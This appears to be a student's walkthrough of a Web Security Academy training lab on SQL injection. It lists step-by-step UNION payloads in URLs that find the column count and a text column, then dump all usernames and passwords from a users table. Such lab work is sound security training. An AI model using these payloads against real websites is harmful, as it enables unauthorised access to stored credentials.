Objective: SQL injection UNION attack, retrieving data from other tables

End Goal: Exploit SQL injection vulnerablity to display sensitive data such as usernames and passwords,
when there's only on column available

Step 1:
Check and see if there's SQL injection vulnerablity in the given site
https://0ab9003203123a55e22fdb9a00df0038.web-security-academy.net/filter?category='
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '''
Observation: Show internal server error

Step 2:
Inject SQL without causing internal server error
https://0ab9003203123a55e22fdb9a00df0038.web-security-academy.net/filter?category='--
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = ''
Observation: There's no internal server error

Step 3:
Determine the number of columns in the table using UNION and NULLs
https://0ab9003203123a55e22fdb9a00df0038.web-security-academy.net/filter?category=' UNION SELECT NULL, NULL--
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '' UNION SELECT NULL, NULL
Observation: See if there's error, if not keep adding NULLs to get no error, that means, the number of NULLs matchs column number on the table.

Step 4:
Determine at least one column that is text type, to do that replace each NULL with 'abc' or random text, if there' an error, replace the next NULL and continue
https://0ab9003203123a55e22fdb9a00df0038.web-security-academy.net/filter?category=' UNION SELECT 'abc', NULL--
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '' UNION SELECT 'abc', NULL
Observation: See if there's error, if not keep replacing NULLs with text strings to get no error, this way you'll know which columns are text type.

Step 5:
Reveal username and password using the found text column, but combine the result of username and password into a singler column
https://0ab9003203123a55e22fdb9a00df0038.web-security-academy.net/filter?category=' UNION SELECT NULL, username||'~'||password FROM users--
Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '' UNION SELECT NULL, username||'~'||password FROM users
This will reveal the all usernames and passwords on the website